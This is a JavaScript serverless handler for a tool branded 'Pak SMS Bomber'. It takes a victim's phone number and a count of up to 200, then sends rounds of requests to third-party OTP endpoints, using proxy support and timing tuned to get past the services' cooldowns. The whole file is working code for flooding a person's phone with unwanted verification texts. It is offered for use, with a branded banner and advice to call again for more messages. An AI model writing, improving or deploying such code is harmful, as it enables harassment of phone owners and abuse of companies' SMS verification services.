import { ENDPOINTS, ENDPOINT_MAP } from '../lib/endpoints.js';
import { runRound, proxyCount } from '../lib/runner.js';
import { HttpError, normalize, readBody, shuffle, clientIp, sleep } from '../lib/util.js';

const BRAND = {
  api: 'Pak SMS Bomber',
  devp: 'Sardar Daud Arain',
  powered_by: 'Dark Empire',
  version: '1.0.0',
};

const MAX_AMOUNT = 200;
const MAX_DURATION_MS = 54_000;   // hard internal budget under Vercel's 60s cap
const STAGGER_MS = 320;           // gap between outbound requests inside a round
const DEFAULT_GAP_S = 20;         // seconds between rounds (OTP cooldowns are ~60s)

// light per-IP guard (per warm instance)
const ipHits = new Map();
function ipGuard(ip) {
  const now = Date.now();
  const rec = ipHits.get(ip) || { count: 0, ts: now };
  if (now - rec.ts > 60_000) {
    rec.count = 0;
    rec.ts = now;
  }
  rec.count++;
  ipHits.set(ip, rec);
  if (ipHits.size > 5000) ipHits.clear();
  return rec.count <= 40;
}

function banner(payload) {
  return [
    '======================================================',
    '        PAK SMS BOMBER  ·  OTP EDITION',
    '        Devp : Sardar Daud Arain',
    '        Power By : Dark Empire',
    '======================================================',
    `Number     : ${payload.number.plus}`,
    `Requested  : ${payload.amount_requested}`,
    `Dispatched : ${payload.amount_dispatched}`,
    `Sent       : ${payload.success_count}   Throttled : ${payload.throttled_count}   Failed : ${payload.fail_count}`,
    `Duration   : ${payload.duration_ms} ms   Proxies : ${payload.proxies_available}`,
    '------------------------------------------------------',
    ...payload.results.map(
      (r) =>
        `[${r.status.toUpperCase().padEnd(9)}] #${String(r.id).padStart(2, '0')} ${r.name.padEnd(16)} ` +
        `http=${String(r.http).padEnd(3)} ${r.ms}ms ${r.via} v${r.variant} :: ${r.note}`
    ),
    '======================================================',
  ].join('\n');
}

export default async function handler(req, res) {
  const started = Date.now();

  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.setHeader('X-Devp', BRAND.devp);
  res.setHeader('X-Powered-By', BRAND.powered_by);

  if (req.method === 'OPTIONS') {
    res.status(204).end();
    return;
  }
  if (req.method !== 'GET' && req.method !== 'POST') {
    res.status(405).json({ ok: false, error: 'method not allowed', branding: BRAND });
    return;
  }

  try {
    if (!ipGuard(clientIp(req))) {
      throw new HttpError(429, 'too many API calls from this IP — wait a minute');
    }

    const q = req.query || {};
    const body = req.method === 'POST' ? await readBody(req) : {};
    const pick = (k) => q[k] ?? body[k];

    const number = normalize(pick('number') || pick('num') || pick('phone') || pick('msisdn'));

    let amount = parseInt(pick('amount') ?? pick('count') ?? '11', 10);
    if (!Number.isFinite(amount)) throw new HttpError(400, 'amount must be a number');
    amount = Math.max(1, Math.min(MAX_AMOUNT, amount));

    const only = String(pick('only') || '')
      .split(',')
      .map((x) => parseInt(x.trim(), 10))
      .filter((x) => ENDPOINT_MAP.has(x));

    let pool = only.length ? only.map((id) => ENDPOINT_MAP.get(id)) : [...ENDPOINTS];

    let gapS = parseFloat(pick('gap') ?? DEFAULT_GAP_S);
    if (!Number.isFinite(gapS)) gapS = DEFAULT_GAP_S;
    gapS = Math.max(0, Math.min(120, gapS));

    // ---- plan: rounds of shuffled endpoints ----
    const perRound = Math.min(pool.length, amount);
    const roundsNeeded = Math.ceil(amount / perRound);
    let rounds = roundsNeeded;

    // fit into the serverless budget
    while (rounds > 1 && (rounds - 1) * gapS * 1000 + perRound * STAGGER_MS > MAX_DURATION_MS - 6000) {
      rounds--;
    }

    const plan = [];
    for (let r = 0; r < rounds; r++) {
      const slice = shuffle([...pool]).slice(0, Math.min(perRound, amount - plan.length));
      if (!slice.length) break;
      plan.push(slice);
    }

    const plannedTotal = plan.reduce((a, b) => a + b.length, 0);
    const deadline = started + MAX_DURATION_MS;

    // ---- dry run ----
    if (String(pick('dry')) === '1' || String(pick('dry')) === 'true') {
      res.status(200).json({
        ok: true,
        branding: BRAND,
        number,
        amount_requested: amount,
        planned_rounds: plan.length,
        planned_total: plannedTotal,
        rounds_fit: plannedTotal >= amount,
        gap_seconds: gapS,
        stagger_ms: STAGGER_MS,
        proxies_available: proxyCount,
        plan: plan.map((r, i) => ({ round: i, endpoints: r.map((e) => e.name) })),
        note:
          plannedTotal < amount
            ? `serverless budget fits ${plannedTotal} of ${amount} SMS — call again after 60s for the rest`
            : 'plan fits inside the execution budget',
      });
      return;
    }

    // ---- execute ----
    const results = [];
    for (let r = 0; r < plan.length; r++) {
      if (Date.now() >= deadline - 2000) break;

      const batch = await runRound(plan[r], number, deadline, STAGGER_MS);
      results.push(...batch);

      if (r < plan.length - 1) {
        const wait = gapS * 1000 - batch.length * STAGGER_MS;
        if (wait > 0 && Date.now() + wait < deadline - 2500) await sleep(wait);
      }
    }

    const success_count = results.filter((x) => x.status === 'sent').length;
    const throttled_count = results.filter((x) => x.status === 'throttled').length;
    const skipped_count = results.filter((x) => x.status === 'skipped').length;
    const fail_count = results.length - success_count - throttled_count - skipped_count;

    const payload = {
      ok: true,
      branding: BRAND,
      number,
      amount_requested: amount,
      amount_dispatched: results.length,
      amount_not_reached: Math.max(0, amount - results.length),
      success_count,
      throttled_count,
      skipped_count,
      fail_count,
      duration_ms: Date.now() - started,
      proxies_available: proxyCount,
      rounds_run: plan.length,
      gap_seconds: gapS,
      results,
      advice:
        amount > results.length
          ? 'Endpoint cooldowns reached — hit the same URL again after ~60s for the remaining amount.'
          : 'Done.',
      timestamp: new Date().toISOString(),
    };

    const format = String(pick('format') || 'json').toLowerCase();
    if (format === 'text') {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.status(200).send(banner(payload) + '\n' + JSON.stringify(payload, null, 2));
      return;
    }

    res.status(200).json(payload);
  } catch (err) {
    const status = err instanceof HttpError ? err.status : 500;
    res.status(status).json({
      ok: false,
      branding: BRAND,
      error: err?.message || 'internal error',
      duration_ms: Date.now() - started,
    });
  }
      }
